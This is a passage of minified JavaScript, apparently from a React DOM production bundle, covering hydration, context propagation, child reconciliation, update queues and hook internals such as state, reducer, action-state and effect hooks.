t=e.stateNode,l=e.type,a=e.memoizedProps;switch(t[$]=e,t[fe]=a,l){case"dialog":he("cancel",t),he("close",t);break;case"iframe":case"object":case"embed":he("load",t);break;case"video":case"audio":for(l=0;l<Zn.length;l++)he(Zn[l],t);break;case"source":he("error",t);break;case"img":case"image":case"link":he("error",t),he("load",t);break;case"details":he("toggle",t);break;case"input":he("invalid",t),yo(t,a.value,a.defaultValue,a.checked,a.defaultChecked,a.type,a.name,!0);break;case"select":he("invalid",t);break;case"textarea":he("invalid",t),go(t,a.value,a.defaultValue,a.children)}l=a.children,typeof l!="string"&&typeof l!="number"&&typeof l!="bigint"||t.textContent===""+l||a.suppressHydrationWarning===!0||Sd(t.textContent,l)?(a.popover!=null&&(he("beforetoggle",t),he("toggle",t)),a.onScroll!=null&&he("scroll",t),a.onScrollEnd!=null&&he("scrollend",t),a.onClick!=null&&(t.onclick=ul),t=!0):t=!1,t||Ol(e,!0)}function ar(e){for(ct=e.return;ct;)switch(ct.tag){case 5:case 31:case 13:qt=!1;return;case 27:case 3:qt=!0;return;default:ct=ct.return}}function La(e){if(e!==ct)return!1;if(!ge)return ar(e),ge=!0,!1;var t=e.tag,l;if((l=t!==3&&t!==27)&&((l=t===5)&&(l=e.type,l=!(l!=="form"&&l!=="button")||Ou(e.type,e.memoizedProps)),l=!l),l&&ke&&Ol(e),ar(e),t===13){if(e=e.memoizedState,e=e!==null?e.dehydrated:null,!e)throw Error(m(317));ke=Od(e)}else if(t===31){if(e=e.memoizedState,e=e!==null?e.dehydrated:null,!e)throw Error(m(317));ke=Od(e)}else t===27?(t=ke,Vl(e.type)?(e=Hu,Hu=null,ke=e):ke=t):ke=ct?Vt(e.stateNode.nextSibling):null;return!0}function sa(){ke=ct=null,ge=!1}function dc(){var e=zl;return e!==null&&(Tt===null?Tt=e:Tt.push.apply(Tt,e),zl=null),e}function Nn(e){zl===null?zl=[e]:zl.push(e)}var hc=f(null),ca=null,dl=null;function wl(e,t,l){w(hc,t._currentValue),t._currentValue=l}function hl(e){e._currentValue=hc.current,j(hc)}function mc(e,t,l){for(;e!==null;){var a=e.alternate;if((e.childLanes&t)!==t?(e.childLanes|=t,a!==null&&(a.childLanes|=t)):a!==null&&(a.childLanes&t)!==t&&(a.childLanes|=t),e===l)break;e=e.return}}function yc(e,t,l,a){var n=e.child;for(n!==null&&(n.return=e);n!==null;){var i=n.dependencies;if(i!==null){var c=n.child;i=i.firstContext;e:for(;i!==null;){var u=i;i=n;for(var r=0;r<t.length;r++)if(u.context===t[r]){i.lanes|=l,u=i.alternate,u!==null&&(u.lanes|=l),mc(i.return,l,e),a||(c=null);break e}i=u.next}}else if(n.tag===18){if(c=n.return,c===null)throw Error(m(341));c.lanes|=l,i=c.alternate,i!==null&&(i.lanes|=l),mc(c,l,e),c=null}else c=n.child;if(c!==null)c.return=n;else for(c=n;c!==null;){if(c===e){c=null;break}if(n=c.sibling,n!==null){n.return=c.return,c=n;break}c=c.return}n=c}}function Ba(e,t,l,a){e=null;for(var n=t,i=!1;n!==null;){if(!i){if((n.flags&524288)!==0)i=!0;else if((n.flags&262144)!==0)break}if(n.tag===10){var c=n.alternate;if(c===null)throw Error(m(387));if(c=c.memoizedProps,c!==null){var u=n.type;Et(n.pendingProps.value,c.value)||(e!==null?e.push(u):e=[u])}}else if(n===re.current){if(c=n.alternate,c===null)throw Error(m(387));c.memoizedState.memoizedState!==n.memoizedState.memoizedState&&(e!==null?e.push(Fn):e=[Fn])}n=n.return}e!==null&&yc(t,e,l,a),t.flags|=262144}function _i(e){for(e=e.firstContext;e!==null;){if(!Et(e.context._currentValue,e.memoizedValue))return!0;e=e.next}return!1}function ua(e){ca=e,dl=null,e=e.dependencies,e!==null&&(e.firstContext=null)}function ut(e){return nr(ca,e)}function Mi(e,t){return ca===null&&ua(e),nr(e,t)}function nr(e,t){var l=t._currentValue;if(t={context:t,memoizedValue:l,next:null},dl===null){if(e===null)throw Error(m(308));dl=t,e.dependencies={lanes:0,firstContext:t},e.flags|=524288}else dl=dl.next=t;return l}var vm=typeof AbortController<"u"?AbortController:function(){var e=[],t=this.signal={aborted:!1,addEventListener:function(l,a){e.push(a)}};this.abort=function(){t.aborted=!0,e.forEach(function(l){return l()})}},bm=z.unstable_scheduleCallback,Sm=z.unstable_NormalPriority,We={$$typeof:G,Consumer:null,Provider:null,_currentValue:null,_currentValue2:null,_threadCount:0};function pc(){return{controller:new vm,data:new Map,refCount:0}}function Cn(e){e.refCount--,e.refCount===0&&bm(Sm,function(){e.controller.abort()})}var An=null,gc=0,Ya=0,qa=null;function xm(e,t){if(An===null){var l=An=[];gc=0,Ya=Su(),qa={status:"pending",value:void 0,then:function(a){l.push(a)}}}return gc++,t.then(ir,ir),t}function ir(){if(--gc===0&&An!==null){qa!==null&&(qa.status="fulfilled");var e=An;An=null,Ya=0,qa=null;for(var t=0;t<e.length;t++)(0,e[t])()}}function jm(e,t){var l=[],a={status:"pending",value:null,reason:null,then:function(n){l.push(n)}};return e.then(function(){a.status="fulfilled",a.value=t;for(var n=0;n<l.length;n++)(0,l[n])(t)},function(n){for(a.status="rejected",a.reason=n,n=0;n<l.length;n++)(0,l[n])(void 0)}),a}var sr=S.S;S.S=function(e,t){Xf=yt(),typeof t=="object"&&t!==null&&typeof t.then=="function"&&xm(e,t),sr!==null&&sr(e,t)};var oa=f(null);function vc(){var e=oa.current;return e!==null?e:_e.pooledCache}function Di(e,t){t===null?w(oa,oa.current):w(oa,t.pool)}function cr(){var e=vc();return e===null?null:{parent:We._currentValue,pool:e}}var Ga=Error(m(460)),bc=Error(m(474)),Hi=Error(m(542)),ki={then:function(){}};function ur(e){return e=e.status,e==="fulfilled"||e==="rejected"}function or(e,t,l){switch(l=e[l],l===void 0?e.push(t):l!==t&&(t.then(ul,ul),t=l),t.status){case"fulfilled":return t.value;case"rejected":throw e=t.reason,fr(e),e;default:if(typeof t.status=="string")t.then(ul,ul);else{if(e=_e,e!==null&&100<e.shellSuspendCounter)throw Error(m(482));e=t,e.status="pending",e.then(function(a){if(t.status==="pending"){var n=t;n.status="fulfilled",n.value=a}},function(a){if(t.status==="pending"){var n=t;n.status="rejected",n.reason=a}})}switch(t.status){case"fulfilled":return t.value;case"rejected":throw e=t.reason,fr(e),e}throw fa=t,Ga}}function ra(e){try{var t=e._init;return t(e._payload)}catch(l){throw l!==null&&typeof l=="object"&&typeof l.then=="function"?(fa=l,Ga):l}}var fa=null;function rr(){if(fa===null)throw Error(m(459));var e=fa;return fa=null,e}function fr(e){if(e===Ga||e===Hi)throw Error(m(483))}var Va=null,En=0;function Ri(e){var t=En;return En+=1,Va===null&&(Va=[]),or(Va,e,t)}function zn(e,t){t=t.props.ref,e.ref=t!==void 0?t:null}function Ui(e,t){throw t.$$typeof===Te?Error(m(525)):(e=Object.prototype.toString.call(t),Error(m(31,e==="[object Object]"?"object with keys {"+Object.keys(t).join(", ")+"}":e)))}function dr(e){function t(h,d){if(e){var y=h.deletions;y===null?(h.deletions=[d],h.flags|=16):y.push(d)}}function l(h,d){if(!e)return null;for(;d!==null;)t(h,d),d=d.sibling;return null}function a(h){for(var d=new Map;h!==null;)h.key!==null?d.set(h.key,h):d.set(h.index,h),h=h.sibling;return d}function n(h,d){return h=rl(h,d),h.index=0,h.sibling=null,h}function i(h,d,y){return h.index=y,e?(y=h.alternate,y!==null?(y=y.index,y<d?(h.flags|=67108866,d):y):(h.flags|=67108866,d)):(h.flags|=1048576,d)}function c(h){return e&&h.alternate===null&&(h.flags|=67108866),h}function u(h,d,y,N){return d===null||d.tag!==6?(d=cc(y,h.mode,N),d.return=h,d):(d=n(d,y),d.return=h,d)}function r(h,d,y,N){var Z=y.type;return Z===Ve?x(h,d,y.props.children,N,y.key):d!==null&&(d.elementType===Z||typeof Z=="object"&&Z!==null&&Z.$$typeof===H&&ra(Z)===d.type)?(d=n(d,y.props),zn(d,y),d.return=h,d):(d=Oi(y.type,y.key,y.props,null,h.mode,N),zn(d,y),d.return=h,d)}function p(h,d,y,N){return d===null||d.tag!==4||d.stateNode.containerInfo!==y.containerInfo||d.stateNode.implementation!==y.implementation?(d=uc(y,h.mode,N),d.return=h,d):(d=n(d,y.children||[]),d.return=h,d)}function x(h,d,y,N,Z){return d===null||d.tag!==7?(d=ia(y,h.mode,N,Z),d.return=h,d):(d=n(d,y),d.return=h,d)}function A(h,d,y){if(typeof d=="string"&&d!==""||typeof d=="number"||typeof d=="bigint")return d=cc(""+d,h.mode,y),d.return=h,d;if(typeof d=="object"&&d!==null){switch(d.$$typeof){case se:return y=Oi(d.type,d.key,d.props,null,h.mode,y),zn(y,d),y.return=h,y;case Ge:return d=uc(d,h.mode,y),d.return=h,d;case H:return d=ra(d),A(h,d,y)}if(Ne(d)||pe(d))return d=ia(d,h.mode,y,null),d.return=h,d;if(typeof d.then=="function")return A(h,Ri(d),y);if(d.$$typeof===G)return A(h,Mi(h,d),y);Ui(h,d)}return null}function g(h,d,y,N){var Z=d!==null?d.key:null;if(typeof y=="string"&&y!==""||typeof y=="number"||typeof y=="bigint")return Z!==null?null:u(h,d,""+y,N);if(typeof y=="object"&&y!==null){switch(y.$$typeof){case se:return y.key===Z?r(h,d,y,N):null;case Ge:return y.key===Z?p(h,d,y,N):null;case H:return y=ra(y),g(h,d,y,N)}if(Ne(y)||pe(y))return Z!==null?null:x(h,d,y,N,null);if(typeof y.then=="function")return g(h,d,Ri(y),N);if(y.$$typeof===G)return g(h,d,Mi(h,y),N);Ui(h,y)}return null}function v(h,d,y,N,Z){if(typeof N=="string"&&N!==""||typeof N=="number"||typeof N=="bigint")return h=h.get(y)||null,u(d,h,""+N,Z);if(typeof N=="object"&&N!==null){switch(N.$$typeof){case se:return h=h.get(N.key===null?y:N.key)||null,r(d,h,N,Z);case Ge:return h=h.get(N.key===null?y:N.key)||null,p(d,h,N,Z);case H:return N=ra(N),v(h,d,y,N,Z)}if(Ne(N)||pe(N))return h=h.get(y)||null,x(d,h,N,Z,null);if(typeof N.then=="function")return v(h,d,y,Ri(N),Z);if(N.$$typeof===G)return v(h,d,y,Mi(d,N),Z);Ui(d,N)}return null}function L(h,d,y,N){for(var Z=null,be=null,Y=d,ne=d=0,ye=null;Y!==null&&ne<y.length;ne++){Y.index>ne?(ye=Y,Y=null):ye=Y.sibling;var Se=g(h,Y,y[ne],N);if(Se===null){Y===null&&(Y=ye);break}e&&Y&&Se.alternate===null&&t(h,Y),d=i(Se,d,ne),be===null?Z=Se:be.sibling=Se,be=Se,Y=ye}if(ne===y.length)return l(h,Y),ge&&fl(h,ne),Z;if(Y===null){for(;ne<y.length;ne++)Y=A(h,y[ne],N),Y!==null&&(d=i(Y,d,ne),be===null?Z=Y:be.sibling=Y,be=Y);return ge&&fl(h,ne),Z}for(Y=a(Y);ne<y.length;ne++)ye=v(Y,h,ne,y[ne],N),ye!==null&&(e&&ye.alternate!==null&&Y.delete(ye.key===null?ne:ye.key),d=i(ye,d,ne),be===null?Z=ye:be.sibling=ye,be=ye);return e&&Y.forEach(function(Jl){return t(h,Jl)}),ge&&fl(h,ne),Z}function J(h,d,y,N){if(y==null)throw Error(m(151));for(var Z=null,be=null,Y=d,ne=d=0,ye=null,Se=y.next();Y!==null&&!Se.done;ne++,Se=y.next()){Y.index>ne?(ye=Y,Y=null):ye=Y.sibling;var Jl=g(h,Y,Se.value,N);if(Jl===null){Y===null&&(Y=ye);break}e&&Y&&Jl.alternate===null&&t(h,Y),d=i(Jl,d,ne),be===null?Z=Jl:be.sibling=Jl,be=Jl,Y=ye}if(Se.done)return l(h,Y),ge&&fl(h,ne),Z;if(Y===null){for(;!Se.done;ne++,Se=y.next())Se=A(h,Se.value,N),Se!==null&&(d=i(Se,d,ne),be===null?Z=Se:be.sibling=Se,be=Se);return ge&&fl(h,ne),Z}for(Y=a(Y);!Se.done;ne++,Se=y.next())Se=v(Y,h,ne,Se.value,N),Se!==null&&(e&&Se.alternate!==null&&Y.delete(Se.key===null?ne:Se.key),d=i(Se,d,ne),be===null?Z=Se:be.sibling=Se,be=Se);return e&&Y.forEach(function(Dy){return t(h,Dy)}),ge&&fl(h,ne),Z}function we(h,d,y,N){if(typeof y=="object"&&y!==null&&y.type===Ve&&y.key===null&&(y=y.props.children),typeof y=="object"&&y!==null){switch(y.$$typeof){case se:e:{for(var Z=y.key;d!==null;){if(d.key===Z){if(Z=y.type,Z===Ve){if(d.tag===7){l(h,d.sibling),N=n(d,y.props.children),N.return=h,h=N;break e}}else if(d.elementType===Z||typeof Z=="object"&&Z!==null&&Z.$$typeof===H&&ra(Z)===d.type){l(h,d.sibling),N=n(d,y.props),zn(N,y),N.return=h,h=N;break e}l(h,d);break}else t(h,d);d=d.sibling}y.type===Ve?(N=ia(y.props.children,h.mode,N,y.key),N.return=h,h=N):(N=Oi(y.type,y.key,y.props,null,h.mode,N),zn(N,y),N.return=h,h=N)}return c(h);case Ge:e:{for(Z=y.key;d!==null;){if(d.key===Z)if(d.tag===4&&d.stateNode.containerInfo===y.containerInfo&&d.stateNode.implementation===y.implementation){l(h,d.sibling),N=n(d,y.children||[]),N.return=h,h=N;break e}else{l(h,d);break}else t(h,d);d=d.sibling}N=uc(y,h.mode,N),N.return=h,h=N}return c(h);case H:return y=ra(y),we(h,d,y,N)}if(Ne(y))return L(h,d,y,N);if(pe(y)){if(Z=pe(y),typeof Z!="function")throw Error(m(150));return y=Z.call(y),J(h,d,y,N)}if(typeof y.then=="function")return we(h,d,Ri(y),N);if(y.$$typeof===G)return we(h,d,Mi(h,y),N);Ui(h,y)}return typeof y=="string"&&y!==""||typeof y=="number"||typeof y=="bigint"?(y=""+y,d!==null&&d.tag===6?(l(h,d.sibling),N=n(d,y),N.return=h,h=N):(l(h,d),N=cc(y,h.mode,N),N.return=h,h=N),c(h)):l(h,d)}return function(h,d,y,N){try{En=0;var Z=we(h,d,y,N);return Va=null,Z}catch(Y){if(Y===Ga||Y===Hi)throw Y;var be=zt(29,Y,null,h.mode);return be.lanes=N,be.return=h,be}}}var da=dr(!0),hr=dr(!1),_l=!1;function Sc(e){e.updateQueue={baseState:e.memoizedState,firstBaseUpdate:null,lastBaseUpdate:null,shared:{pending:null,lanes:0,hiddenCallbacks:null},callbacks:null}}function xc(e,t){e=e.updateQueue,t.updateQueue===e&&(t.updateQueue={baseState:e.baseState,firstBaseUpdate:e.firstBaseUpdate,lastBaseUpdate:e.lastBaseUpdate,shared:e.shared,callbacks:null})}function Ml(e){return{lane:e,tag:0,payload:null,callback:null,next:null}}function Dl(e,t,l){var a=e.updateQueue;if(a===null)return null;if(a=a.shared,(je&2)!==0){var n=a.pending;return n===null?t.next=t:(t.next=n.next,n.next=t),a.pending=t,t=zi(e),$o(e,null,l),t}return Ei(e,a,t,l),zi(e)}function On(e,t,l){if(t=t.updateQueue,t!==null&&(t=t.shared,(l&4194048)!==0)){var a=t.lanes;a&=e.pendingLanes,l|=a,t.lanes=l,hi(e,l)}}function jc(e,t){var l=e.updateQueue,a=e.alternate;if(a!==null&&(a=a.updateQueue,l===a)){var n=null,i=null;if(l=l.firstBaseUpdate,l!==null){do{var c={lane:l.lane,tag:l.tag,payload:l.payload,callback:null,next:null};i===null?n=i=c:i=i.next=c,l=l.next}while(l!==null);i===null?n=i=t:i=i.next=t}else n=i=t;l={baseState:a.baseState,firstBaseUpdate:n,lastBaseUpdate:i,shared:a.shared,callbacks:a.callbacks},e.updateQueue=l;return}e=l.lastBaseUpdate,e===null?l.firstBaseUpdate=t:e.next=t,l.lastBaseUpdate=t}var Tc=!1;function wn(){if(Tc){var e=qa;if(e!==null)throw e}}function _n(e,t,l,a){Tc=!1;var n=e.updateQueue;_l=!1;var i=n.firstBaseUpdate,c=n.lastBaseUpdate,u=n.shared.pending;if(u!==null){n.shared.pending=null;var r=u,p=r.next;r.next=null,c===null?i=p:c.next=p,c=r;var x=e.alternate;x!==null&&(x=x.updateQueue,u=x.lastBaseUpdate,u!==c&&(u===null?x.firstBaseUpdate=p:u.next=p,x.lastBaseUpdate=r))}if(i!==null){var A=n.baseState;c=0,x=p=r=null,u=i;do{var g=u.lane&-536870913,v=g!==u.lane;if(v?(me&g)===g:(a&g)===g){g!==0&&g===Ya&&(Tc=!0),x!==null&&(x=x.next={lane:0,tag:u.tag,payload:u.payload,callback:null,next:null});e:{var L=e,J=u;g=t;var we=l;switch(J.tag){case 1:if(L=J.payload,typeof L=="function"){A=L.call(we,A,g);break e}A=L;break e;case 3:L.flags=L.flags&-65537|128;case 0:if(L=J.payload,g=typeof L=="function"?L.call(we,A,g):L,g==null)break e;A=Q({},A,g);break e;case 2:_l=!0}}g=u.callback,g!==null&&(e.flags|=64,v&&(e.flags|=8192),v=n.callbacks,v===null?n.callbacks=[g]:v.push(g))}else v={lane:g,tag:u.tag,payload:u.payload,callback:u.callback,next:null},x===null?(p=x=v,r=A):x=x.next=v,c|=g;if(u=u.next,u===null){if(u=n.shared.pending,u===null)break;v=u,u=v.next,v.next=null,n.lastBaseUpdate=v,n.shared.pending=null}}while(!0);x===null&&(r=A),n.baseState=r,n.firstBaseUpdate=p,n.lastBaseUpdate=x,i===null&&(n.shared.lanes=0),Ll|=c,e.lanes=c,e.memoizedState=A}}function mr(e,t){if(typeof e!="function")throw Error(m(191,e));e.call(t)}function yr(e,t){var l=e.callbacks;if(l!==null)for(e.callbacks=null,e=0;e<l.length;e++)mr(l[e],t)}var Xa=f(null),Li=f(0);function pr(e,t){e=jl,w(Li,e),w(Xa,t),jl=e|t.baseLanes}function Nc(){w(Li,jl),w(Xa,Xa.current)}function Cc(){jl=Li.current,j(Xa),j(Li)}var Ot=f(null),Gt=null;function Hl(e){var t=e.alternate;w(Qe,Qe.current&1),w(Ot,e),Gt===null&&(t===null||Xa.current!==null||t.memoizedState!==null)&&(Gt=e)}function Ac(e){w(Qe,Qe.current),w(Ot,e),Gt===null&&(Gt=e)}function gr(e){e.tag===22?(w(Qe,Qe.current),w(Ot,e),Gt===null&&(Gt=e)):kl()}function kl(){w(Qe,Qe.current),w(Ot,Ot.current)}function wt(e){j(Ot),Gt===e&&(Gt=null),j(Qe)}var Qe=f(0);function Bi(e){for(var t=e;t!==null;){if(t.tag===13){var l=t.memoizedState;if(l!==null&&(l=l.dehydrated,l===null||Mu(l)||Du(l)))return t}else if(t.tag===19&&(t.memoizedProps.revealOrder==="forwards"||t.memoizedProps.revealOrder==="backwards"||t.memoizedProps.revealOrder==="unstable_legacy-backwards"||t.memoizedProps.revealOrder==="together")){if((t.flags&128)!==0)return t}else if(t.child!==null){t.child.return=t,t=t.child;continue}if(t===e)break;for(;t.sibling===null;){if(t.return===null||t.return===e)return null;t=t.return}t.sibling.return=t.return,t=t.sibling}return null}var ml=0,ae=null,ze=null,$e=null,Yi=!1,Qa=!1,ha=!1,qi=0,Mn=0,Za=null,Tm=0;function Ye(){throw Error(m(321))}function Ec(e,t){if(t===null)return!1;for(var l=0;l<t.length&&l<e.length;l++)if(!Et(e[l],t[l]))return!1;return!0}function zc(e,t,l,a,n,i){return ml=i,ae=t,t.memoizedState=null,t.updateQueue=null,t.lanes=0,S.H=e===null||e.memoizedState===null?ef:Vc,ha=!1,i=l(a,n),ha=!1,Qa&&(i=br(t,l,a,n)),vr(e),i}function vr(e){S.H=kn;var t=ze!==null&&ze.next!==null;if(ml=0,$e=ze=ae=null,Yi=!1,Mn=0,Za=null,t)throw Error(m(300));e===null||Fe||(e=e.dependencies,e!==null&&_i(e)&&(Fe=!0))}function br(e,t,l,a){ae=e;var n=0;do{if(Qa&&(Za=null),Mn=0,Qa=!1,25<=n)throw Error(m(301));if(n+=1,$e=ze=null,e.updateQueue!=null){var i=e.updateQueue;i.lastEffect=null,i.events=null,i.stores=null,i.memoCache!=null&&(i.memoCache.index=0)}S.H=tf,i=t(l,a)}while(Qa);return i}function Nm(){var e=S.H,t=e.useState()[0];return t=typeof t.then=="function"?Dn(t):t,e=e.useState()[0],(ze!==null?ze.memoizedState:null)!==e&&(ae.flags|=1024),t}function Oc(){var e=qi!==0;return qi=0,e}function wc(e,t,l){t.updateQueue=e.updateQueue,t.flags&=-2053,e.lanes&=~l}function _c(e){if(Yi){for(e=e.memoizedState;e!==null;){var t=e.queue;t!==null&&(t.pending=null),e=e.next}Yi=!1}ml=0,$e=ze=ae=null,Qa=!1,Mn=qi=0,Za=null}function vt(){var e={memoizedState:null,baseState:null,baseQueue:null,queue:null,next:null};return $e===null?ae.memoizedState=$e=e:$e=$e.next=e,$e}function Ze(){if(ze===null){var e=ae.alternate;e=e!==null?e.memoizedState:null}else e=ze.next;var t=$e===null?ae.memoizedState:$e.next;if(t!==null)$e=t,ze=e;else{if(e===null)throw ae.alternate===null?Error(m(467)):Error(m(310));ze=e,e={memoizedState:ze.memoizedState,baseState:ze.baseState,baseQueue:ze.baseQueue,queue:ze.queue,next:null},$e===null?ae.memoizedState=$e=e:$e=$e.next=e}return $e}function Gi(){return{lastEffect:null,events:null,stores:null,memoCache:null}}function Dn(e){var t=Mn;return Mn+=1,Za===null&&(Za=[]),e=or(Za,e,t),t=ae,($e===null?t.memoizedState:$e.next)===null&&(t=t.alternate,S.H=t===null||t.memoizedState===null?ef:Vc),e}function Vi(e){if(e!==null&&typeof e=="object"){if(typeof e.then=="function")return Dn(e);if(e.$$typeof===G)return ut(e)}throw Error(m(438,String(e)))}function Mc(e){var t=null,l=ae.updateQueue;if(l!==null&&(t=l.memoCache),t==null){var a=ae.alternate;a!==null&&(a=a.updateQueue,a!==null&&(a=a.memoCache,a!=null&&(t={data:a.data.map(function(n){return n.slice()}),index:0})))}if(t==null&&(t={data:[],index:0}),l===null&&(l=Gi(),ae.updateQueue=l),l.memoCache=t,l=t.data[t.index],l===void 0)for(l=t.data[t.index]=Array(e),a=0;a<e;a++)l[a]=He;return t.index++,l}function yl(e,t){return typeof t=="function"?t(e):t}function Xi(e){var t=Ze();return Dc(t,ze,e)}function Dc(e,t,l){var a=e.queue;if(a===null)throw Error(m(311));a.lastRenderedReducer=l;var n=e.baseQueue,i=a.pending;if(i!==null){if(n!==null){var c=n.next;n.next=i.next,i.next=c}t.baseQueue=n=i,a.pending=null}if(i=e.baseState,n===null)e.memoizedState=i;else{t=n.next;var u=c=null,r=null,p=t,x=!1;do{var A=p.lane&-536870913;if(A!==p.lane?(me&A)===A:(ml&A)===A){var g=p.revertLane;if(g===0)r!==null&&(r=r.next={lane:0,revertLane:0,gesture:null,action:p.action,hasEagerState:p.hasEagerState,eagerState:p.eagerState,next:null}),A===Ya&&(x=!0);else if((ml&g)===g){p=p.next,g===Ya&&(x=!0);continue}else A={lane:0,revertLane:p.revertLane,gesture:null,action:p.action,hasEagerState:p.hasEagerState,eagerState:p.eagerState,next:null},r===null?(u=r=A,c=i):r=r.next=A,ae.lanes|=g,Ll|=g;A=p.action,ha&&l(i,A),i=p.hasEagerState?p.eagerState:l(i,A)}else g={lane:A,revertLane:p.revertLane,gesture:p.gesture,action:p.action,hasEagerState:p.hasEagerState,eagerState:p.eagerState,next:null},r===null?(u=r=g,c=i):r=r.next=g,ae.lanes|=A,Ll|=A;p=p.next}while(p!==null&&p!==t);if(r===null?c=i:r.next=u,!Et(i,e.memoizedState)&&(Fe=!0,x&&(l=qa,l!==null)))throw l;e.memoizedState=i,e.baseState=c,e.baseQueue=r,a.lastRenderedState=i}return n===null&&(a.lanes=0),[e.memoizedState,a.dispatch]}function Hc(e){var t=Ze(),l=t.queue;if(l===null)throw Error(m(311));l.lastRenderedReducer=e;var a=l.dispatch,n=l.pending,i=t.memoizedState;if(n!==null){l.pending=null;var c=n=n.next;do i=e(i,c.action),c=c.next;while(c!==n);Et(i,t.memoizedState)||(Fe=!0),t.memoizedState=i,t.baseQueue===null&&(t.baseState=i),l.lastRenderedState=i}return[i,a]}function Sr(e,t,l){var a=ae,n=Ze(),i=ge;if(i){if(l===void 0)throw Error(m(407));l=l()}else l=t();var c=!Et((ze||n).memoizedState,l);if(c&&(n.memoizedState=l,Fe=!0),n=n.queue,Uc(Tr.bind(null,a,n,e),[e]),n.getSnapshot!==t||c||$e!==null&&$e.memoizedState.tag&1){if(a.flags|=2048,Ka(9,{destroy:void 0},jr.bind(null,a,n,l,t),null),_e===null)throw Error(m(349));i||(ml&127)!==0||xr(a,t,l)}return l}function xr(e,t,l){e.flags|=16384,e={getSnapshot:t,value:l},t=ae.updateQueue,t===null?(t=Gi(),ae.updateQueue=t,t.stores=[e]):(l=t.stores,l===null?t.stores=[e]:l.push(e))}function jr(e,t,l,a){t.value=l,t.getSnapshot=a,Nr(t)&&Cr(e)}function Tr(e,t,l){return l(function(){Nr(t)&&Cr(e)})}function Nr(e){var t=e.getSnapshot;e=e.value;try{var l=t();return!Et(e,l)}catch{return!0}}function Cr(e){var t=na(e,2);t!==null&&Nt(t,e,2)}function kc(e){var t=vt();if(typeof e=="function"){var l=e;if(e=l(),ha){$t(!0);try{l()}finally{$t(!1)}}}return t.memoizedState=t.baseState=e,t.queue={pending:null,lanes:0,dispatch:null,lastRenderedReducer:yl,lastRenderedState:e},t}function Ar(e,t,l,a){return e.baseState=l,Dc(e,ze,typeof a=="function"?a:yl)}function Cm(e,t,l,a,n){if(Ki(e))throw Error(m(485));if(e=t.action,e!==null){var i={payload:n,action:e,next:null,isTransition:!0,status:"pending",value:null,reason:null,listeners:[],then:function(c){i.listeners.push(c)}};S.T!==null?l(!0):i.isTransition=!1,a(i),l=t.pending,l===null?(i.next=t.pending=i,Er(t,i)):(i.next=l.next,t.pending=l.next=i)}}function Er(e,t){var l=t.action,a=t.payload,n=e.state;if(t.isTransition){var i=S.T,c={};S.T=c;try{var u=l(n,a),r=S.S;r!==null&&r(c,u),zr(e,t,u)}catch(p){Rc(e,t,p)}finally{i!==null&&c.types!==null&&(i.types=c.types),S.T=i}}else try{i=l(n,a),zr(e,t,i)}catch(p){Rc(e,t,p)}}function zr(e,t,l){l!==null&&typeof l=="object"&&typeof l.then=="function"?l.then(function(a){Or(e,t,a)},function(a){return Rc(e,t,a)}):Or(e,t,l)}function Or(e,t,l){t.status="fulfilled",t.value=l,wr(t),e.state=l,t=e.pending,t!==null&&(l=t.next,l===t?e.pending=null:(l=l.next,t.next=l,Er(e,l)))}function Rc(e,t,l){var a=e.pending;if(e.pending=null,a!==null){a=a.next;do t.status="rejected",t.reason=l,wr(t),t=t.next;while(t!==a)}e.action=null}function wr(e){e=e.listeners;for(var t=0;t<e.length;t++)(0,e[t])()}function _r(e,t){return t}function Mr(e,t){if(ge){var l=_e.formState;if(l!==null){e:{var a=ae;if(ge){if(ke){t:{for(var n=ke,i=qt;n.nodeType!==8;){if(!i){n=null;break t}if(n=Vt(n.nextSibling),n===null){n=null;break t}}i=n.data,n=i==="F!"||i==="F"?n:null}if(n){ke=Vt(n.nextSibling),a=n.data==="F!";break e}}Ol(a)}a=!1}a&&(t=l[0])}}return l=vt(),l.memoizedState=l.baseState=t,a={pending:null,lanes:0,dispatch:null,lastRenderedReducer:_r,lastRenderedState:t},l.queue=a,l=Fr.bind(null,ae,a),a.dispatch=l,a=kc(!1),i=Gc.bind(null,ae,!1,a.queue),a=vt(),n={state:t,dispatch:null,action:e,pending:null},a.queue=n,l=Cm.bind(null,ae,n,i,l),n.dispatch=l,a.memoizedState=e,[t,l,!1]}function Dr(e){var t=Ze();return Hr(t,ze,e)}function Hr(e,t,l){if(t=Dc(e,t,_r)[0],e=Xi(yl)[0],typeof t=="object"&&t!==null&&typeof t.then=="function")try{var a=Dn(t)}catch(c){throw c===Ga?Hi:c}else a=t;t=Ze();var n=t.queue,i=n.dispatch;return l!==t.memoizedState&&(ae.flags|=2048,Ka(9,{destroy:void 0},Am.bind(null,n,l),null)),[a,i,e]}function Am(e,t){e.action=t}function kr(e){var t=Ze(),l=ze;if(l!==null)return Hr(t,l,e);Ze(),t=t.memoizedState,l=Ze();var a=l.queue.dispatch;return l.memoizedState=e,[t,a,!1]}function Ka(e,t,l,a){return e={tag:e,create:l,deps:a,inst:t,next:null},t=ae.updateQueue,t===null&&(t=Gi(),ae.updateQueue=t),l=t.lastEffect,l===null?t.lastEffect=e.next=e:(a=l.next,l.next=e,e.next=a,t.lastEffect=e),e}function Rr(){return Ze().memoizedState}function Qi(e,t,l,a){var n=vt();ae.flags|=e,n.memoizedState=Ka(1|t,{destroy:void 0},l,a===void 0?null:a)}function Zi(e,t,l,a){var n=Ze();a=a===void 0?null:a;var i=n.memoizedState.inst;ze!==null&&a!==null&&Ec(a,ze.memoizedState.deps)?n.memoizedState=Ka(t,i,l,a):(ae.flags|=e,n.memoizedState=Ka(1|t,i,l,a))}function Ur(e,t){Qi(8390656,8,e,t)}function Uc(e,t){Zi(2048,8,e,t)}function Em(e){ae.flags|=4;var t=ae.updateQueue;if(t===null)t=Gi(),ae.updateQueue=t,t.events=[e];else{var l=t.events;l===null?t.events=[e]:l.push(e)}}function Lr(e){var t=Ze().memoizedState;return Em({ref:t,nextImpl:e}),function(){if((je&2)!==0)throw Error(m(440));return t.impl.apply(void 0,arguments)}}function Br(e,t){return Zi(4,2,e,t)}function Yr(e,t){return Zi(4,4,e,t)}function qr(e,t){if(typeof t=="function"){e=e();var l=t(e);return function(){typeof l=="function"?l():t(null)}}if(t!=null)return e=e(),t.current=e,function(){t.current=null}}function Gr(e,t,l){l=l!=null?l.concat([e]):null,Zi(4,4,qr.bind(null,t,e),l)}function Lc(){}function Vr(e,t){var l=Ze();t=t===void 0?null:t;var a=l.memoizedState;return t!==null&&Ec(t,a[1])?a[0]:(l.memoizedState=[e,t],e)}function Xr(e,t){var l=Ze();t=t===void 0?null:t;var a=l.memoizedState;if(t!==null&&Ec(t,a[1]))return 